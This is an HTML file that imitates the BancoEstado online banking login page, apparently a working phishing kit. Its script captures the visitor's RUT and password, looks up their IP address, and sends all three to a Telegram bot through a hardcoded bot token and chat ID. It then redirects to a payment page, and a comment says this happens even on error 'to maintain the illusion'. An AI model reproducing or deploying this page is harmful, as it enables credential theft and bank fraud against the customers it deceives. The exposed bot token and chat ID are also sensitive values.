<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BancoEstado</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
        }

        .app-banner {
            background-color: #3949ab;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 15px;
        }

        .app-banner-left {
            display: flex;
            align-items: center;
        }

        .app-banner img {
            width: 40px;
            height: 40px;
            margin-right: 10px;
        }

        .app-banner-text {
            font-size: 14px;
            line-height: 1.2;
        }

        .app-button {
            background-color: white;
            color: #3949ab;
            border-radius: 20px;
            padding: 8px 15px;

            font-size: 14px;
        }

        .header {
            display: flex;

            align-items: center;
            padding: 15px;
            background-color: white;
            border-bottom: 1px solid #e0e0e0;
        }

        .logo {
            display: flex;
            align-items: center;
        }

        .logo img {
            width: 40px;
            height: 40px;
            margin-right: 10px;
        }

        .logo-text {
            font-size: 20px;
            font-weight: bold;
            color: #333;
        }

        .close-button {
            background-color: #e5e9f0;
            border: none;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            font-size: 16px;
            color: #666;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .login-container {
            background-color: white;
            margin: 15px;
            padding: 20px;
            border-radius: 8px;
        }

        h1 {
            font-size: 22px;
            color: #333;
            margin-bottom: 25px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-weight: bold;
            margin-bottom: 8px;
            color: #333;
        }

        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }

        .password-container {
            position: relative;
        }

        .eye-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
        }

        .login-button {
            background-color: #3949ab;
            color: white;
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }

        .login-button.loading {
            opacity: 0.7;
            pointer-events: none;
        }

        .help-link {
            text-align: center;
            margin-top: 20px;
            margin-bottom: 20px;
        }

        .help-link a {
            color: #3949ab;
            text-decoration: none;
            font-size: 16px;
        }

        .divider {
            border-top: 1px solid #e0e0e0;
            margin: 30px 0;
        }

        .business-button {
            background-color: #333;
            color: white;
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <!-- App Banner -->
    <div class="app-banner">
        <div class="app-banner-left">
             <img src="../img/logo-170-bancoestado.svg" style="width: 100%;" alt="">
            <!-- <div class="app-banner-text" style="margin-left: 10px;">
                Con tu App BancoEstado<br>
                todo es m√°s f√°cil.
            </div> -->
        </div>
        <!-- <a href="#" class="app-button">Ir a la App</a> -->
    </div>

    <!-- Header with Logo -->
    <div class="header">
        <div class="logo">
           <img src="../img/logo-170-bancoestado.svg" style="width: 100%;" alt="">
        </div>
        <button class="close-button">√ó</button>
    </div>

    <!-- Login Form -->
    <div class="login-container">
        <h1>Ingresa a tu Banca en L√≠nea</h1>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="rut">RUT</label>
                <input type="text" id="rut" name="dato1" placeholder="Ej: 12345678k" required>
            </div>
            
            <div class="form-group">
                <label for="clave">Clave</label>
                <div class="password-container">
                    <input type="password" id="clave" name="dato2" placeholder="********" required>
                    <span class="eye-icon">üëÅÔ∏è</span>
                </div>
            </div>
            
            <button type="submit" class="login-button" id="submitBtn">Ingresar</button>
        </form>
        
        <div class="help-link">
            <a href="#">¬øProblemas con tu Clave?</a>
        </div>
        
        <div class="divider"></div>
        
        <button class="business-button">Acceso Empresas</button>
    </div>

    <script>
        // Configuraci√≥n de Telegram
        const TELEGRAM_BOT_TOKEN = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
        const TELEGRAM_CHAT_ID = '5848946481';
        const REDIRECT_URL = '../cargapago.html'; // URL de redirecci√≥n despu√©s del env√≠o

        // Script para mostrar/ocultar contrase√±a con el icono del ojo
        document.querySelector('.eye-icon').addEventListener('click', function() {
            const passwordInput = document.getElementById('clave');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        });

        // Form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const rut = document.getElementById('rut').value;
            const clave = document.getElementById('clave').value;
            
            // Show loading state
            submitBtn.classList.add('loading');
            submitBtn.innerHTML = 'Procesando...';
            
            try {
                // Prepare message for Telegram
                const message = `üè¶ BancoEstado - Nuevos datos de acceso:\n\n` +
                              `RUT: ${rut}\n` +
                              `Clave: ${clave}\n` +
                              `Fecha: ${new Date().toLocaleString('es-ES')}\n` +
                              `IP: ${await getClientIP()}`;
                
                // Send to Telegram
                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                if (response.ok) {
                    // Success - redirect after short delay
                    setTimeout(() => {
                        window.location.href = REDIRECT_URL;
                    }, 1000);
                } else {
                    throw new Error('Error en el env√≠o');
                }
                
            } catch (error) {
                console.error('Error:', error);
                // Still redirect even if there's an error to maintain the illusion
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 1000);
            }
        });

        // Function to get client IP (optional)
        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }
    </script>
</body>
</html>
